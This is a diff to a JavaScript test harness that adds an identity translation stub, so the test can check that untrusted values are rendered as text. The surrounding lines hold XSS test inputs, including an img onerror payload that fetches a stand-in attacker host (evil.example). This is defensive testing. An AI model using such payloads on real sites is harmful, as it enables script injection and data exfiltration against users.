@@ -95,6 +95,14 @@ var document = {
   }
 };
 
+// t() stands in for the real catalogue lookup injected by the server. It is an
+// IDENTITY map on purpose: the harness asserts that untrusted values reach the
+// DOM as text, and a stub that invented translated strings would test the stub
+// instead. A key absent from the map returns the key itself, exactly like the
+// real t(), so the caller's missing-key guard is exercised too.
+var I18N = {};
+function t(key) { return Object.prototype.hasOwnProperty.call(I18N, key) ? I18N[key] : key; }
+
 var hostileSSID = '<svg onload=alert(1)>';
 var hostileRouterOut = '<img src=x onerror=fetch("//evil.example")>';
 var job = {
